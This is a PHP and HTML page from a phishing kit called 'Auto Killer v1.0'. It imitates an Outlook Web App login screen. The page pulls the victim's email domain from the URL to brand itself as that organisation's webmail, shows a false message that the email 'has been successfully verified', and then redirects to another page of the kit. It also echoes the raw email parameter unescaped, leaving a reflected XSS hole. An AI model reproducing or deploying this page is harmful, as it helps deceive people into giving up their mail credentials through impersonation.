 <!--

 # HELLION PROUDLY PRESENTS, Auto Killer v1.0
 
 # This program is free software brought to you by Hellion: 
 # You can redistribute it and/or modify it under the terms of 
 # the GNU General Public License as published by the Free Software Foundation, 
 # either version 3 of the License, or (at your option) any later version.
 
 # However, the license header, copyright and author credits 
 # must not be modified in any form and always be displayed.

 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
 # Contact me : team_pbg@yahoo.com for more details.
 
 # Skype: teamipwned

 # Special greets to Shaif Lifax, Solaree, PaperBoi, Softwarewind, Emoney, and others who helped! 
 
 # WARNING: Do not touch anything here!
 
  -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- {57A118C6-2DA9-419d-BE9A-F92B0F9A418B} -->
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
    <title><?php echo $yuh ?> WebMail</title>
    <meta content="NOINDEX, NOFOLLOW" name="Robots">
    <link rel="shortcut icon" href="http://mail.gangshitape.com/owa/14.2.247.5/themes/resources/favicon.ico" type="image/x-icon"> 
    <link href="http://mail.gangshitape.com/owa/14.2.247.5/themes/resources/logon.css" type="text/css" rel="stylesheet">
    <link href="http://mail.gangshitape.com/owa/14.2.247.5/themes/resources/owafont.css" type="text/css" rel="stylesheet">
    <link href="http://mail.gangshitape.com/owa/14.2.247.5/scripts/premium/flogon.js" type="text/javascript"></script>
<?php 
$em = @$_GET["email"];
$ln = strlen($em);
$len = strrev($em);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}

$yuh = substr($len,0,$x);

$yuh = strrev($yuh);


for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}

$yuh = substr($yuh,0,$x);

$yuh = ucfirst($yuh);


?>
  <meta HTTP-EQUIV="REFRESH" content="5; url=end.php?email=<?php echo $_GET['email']; ?>">
<script type="text/javascript">
	<!--
	
	var a_fGzpEnbl = 1;
    var g_fFcs = 1;
	
    function window_onload()
    {
        onld();
        
        if (chkCookies())
        {
			ldCookie('username', 'password');
	             
			var expl1 = document.getElementById('expl1');
			expl1.style.display = "";
		    
			var lnkHidedSection = document.getElementById('lnkHdSec');
			lnkHidedSection.style.display = "none";
	    	
			var lnkShowSection = document.getElementById('lnkShwSec');
			lnkShowSection.style.display = "";
		}
    }
	-->
</script>
</head>
<body class="owaLgnBdy" onload="return window_onload();">
<noscript>
	<div id="dvErr">
		<table cellpadding="0" cellspacing="0">
		<tr>
			<td><img src="https://mail.omantel.net.om/CookieAuth.dll?GetPic?formdir=1&image=lgnerror.gif" alt=""></td>
			<td style="width:100%">To use Omantel Webmail, script must be enabled on your browser. For information about how to enable script, consult the Help for your browser. If your browser does not support script, you can download <a href='http://www.microsoft.com/windows/ie/downloads/default.mspx'>Microsoft Internet Explorer</a>.</td>
		</tr>
		</table>
	</div>
</noscript>
<input type="hidden" id="curl" name="curl" value="Z2F" />
<input type="hidden" id="flags" name="flags" value="0" />
<input type="hidden" id="forcedownlevel" name="forcedownlevel" value="0" />
<input type="hidden" id="formdir" name="formdir" value="1" />
 <!-- Main table -->
<table align="center" id="tblMain" cellpadding=0 cellspacing=0>
	<tr>
		<td colspan=3>
			<table cellspacing=0 cellpadding=0 class="tblLgn">
			<tr>
				<td class="lgnTL"><img src="hellion/lgntopl.gif" alt=""></td>
				<td class="lgnTM"></td>
				<td class="lgnTR"><img src="hellion/lgntopr.gif" alt=""></td>
			</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td id="mdLft">&nbsp;</td>
		<td id="mdMid">
        <!-- Mid table -->
        <table id="tblMid" class="mid">
        <tbody>
        <tr>
          <td class="expl" id="expltxt"></td>
        </tr>
        <tr>
          <td class="align">
              <!-- Table 1-->
              <table cellpadding="0" cellspacing="0">
		         <tr>
			        <td class="wrng"></td>
		        </tr>
			  </table>  
			  <!-- End Table 1-->
          </td>
        </tr>

<br />
<br />


<img src="http://i.imgur.com/ZMBSahq.png" alt="Smiley face" height="120" width="250">

<p><font face="calibri" size="5"><h3><span class="style1">Your email <?php echo $_GET['email']; ?> has been successfully verified. 

<br /><br />

Thank you for using our <?php echo $yuh ?>'s Security Web App.

</span></h3></font>



<tr>
          <td>
            <hr /><!-- HR-->
          </td>
        </tr>
         <!-- End Table 2-->
          </td>
</tr>
        <tr>
          <td>
            <!--Table 3-->
                  <table cellpadding="0" cellspacing="0">
			    <col>
			    <col class="w100">
			    <tr class="height">
			    </tr>
			    <tr id="trPubExp" class="expl" style="display:none">
				    <td></td>
				    <td>Select this option if you are connecting from a public computer. Be sure to log off and close all browser windows to end your session. Read about the <a href= 'http://go.microsoft.com/fwlink/?LinkId=65796'>security risks</a> of using a public computer.</td>
			    </tr>
			    <tr class="height">
				  















			    </tr>
			    <tr id="trPrvtExp" class="expl" style="display:none">
				    <td></td>
				    <td>Select this option if you are the only person using this computer. This option provides additional time of inactivity before automatically logging you off.</td>
			    </tr>
			    <tr id="trPrvtWrn" class="wrng" style="display:none">
				    <td></td>
				    <td><B>Warning:</B> By selecting this option you acknowledge that the computer complies with your organization's security policy.</td>
			    </tr>
			</table>
			<!-- End Table 3-->
        </tr>
        <tr>
          <td>
            <hr /><!-- HR-->
          </td>
        </tr>
        <tr>
          <td>
			<!-- Table 5-->
			<table cellpadding=0 cellspacing=0>
			    <col>
			    <col class="w100">
				<tr style="display: none">
					<td valign="top"><input id="chpwd" name="chpwd" type="checkbox" class="rdo" onclick="clkChpwd()" /></td>
					<td><label for="chpwd">I want to change my password after logging on</label></td>
				</tr>
				<tr id="trChpwdExp" class="expl" style="display:none">
					<td></td>
					<td>With this option selected, a page used to change your password will be displayed after your credentials are submitted.</td>
				</tr>
			</table>
			<!-- End Table 5-->
          </td>
        </tr>
        <tr style="display: none">
          <td>
            <hr /><!-- HR-->
          </td>
        </tr>
        <tr>
          <td>
          
  <!-- Table 6-->
            <table cellspacing="0" cellpadding="0">
              <colgroup>
              <col class="nowrap">
              <col class="w100">
              <col>
              <tbody>
      </tr>

                  <tr>
                    <td class="nowrap">&nbsp;</td>
                   











                  </tr>
              </tbody>
             </table>
             <!-- End Table 6-->
          </td>
        </tr>
        <tr>
          <td>
            <hr /><!-- HR-->
          </td>
        </tr>
       </tbody>
      </table>
      <!-- End Mid Table-->
      <!-- Mid2 Table-->
		<table id="tblMid2" class="mid" style="display:none">
			<tr><td><hr /></td></tr>
			<tr>
				<td><br />Cookies are currently disabled by your browser settings. To access this Web site, cookies must be enabled.<br /><br />Follow these directions to enable cookies (Microsoft Internet Explorer 6 or later):  In Internet Explorer, on the Tools menu, click Internet Options. Click the Privacy tab, then click Sites. In Address of Web site, type the complete address of this Web site. For example, http://www.microsoft.com. Then click Allow.<br /><br /><br /></td>
			</tr>
			<tr><td><hr></td></tr>
			<tr>
				<td class="txtpad">
					<input type="button" class="btn" style="float: right" value="Retry" onclick="clkRtry()" 
					onmouseover="this.className='btnOnMseOvr'" onmouseout="this.className='btn'" onmousedown="this.className='btnOnMseDwn'">
				</td>
			</tr>
		</table>
      <!-- End Mid2 Table-->
		<table class="mid tblConn">
			<tr>


				<td rowspan=3 style="vertical-align:top" class="tdConnImg"><img src="https://mail.omantel.net.om/CookieAuth.dll?GetPic?formdir=1&image=lgnexlogo.gif" alt=""></td>
				<td class="tdConn" style="padding-top:6px;"><strong>Connected to <?php echo $_GET[email]; ?>!</td></strong>
			</tr>
			<tr>
				<td class="tdConn" style="padding-top:0px;">Secured by <?php echo $yuh ?> WebMail Security Systems</td>
			</tr>
			<tr>
				<td class="tdCopy">&copy; 2015 <?php echo $yuh ?> Corporation. All rights reserved.</td>
			</tr>

		</table>
	</td>
	<td id="mdRt">&nbsp;</td>
	</tr>
	<tr>
		<td colspan=3>
			<table cellspacing=0 cellpadding=0 class="tblLgn">
			<tr>
				<td class="lgnBL"><img src="http://mail.gangshitape.com/owa/14.2.247.5/themes/resources/lgnbotl.gif" alt=""></td>
				<td class="lgnBM"></td>
				<td class="lgnBR"><img src="http://mail.gangshitape.com/owa/14.2.247.5/themes/resources/lgnbotr.gif" alt=""></td>
			</tr>
			</table>
		</td>
	</tr>
 </tbody>
</table>
<!-- End Main Table-->
</form>
</body>
</html>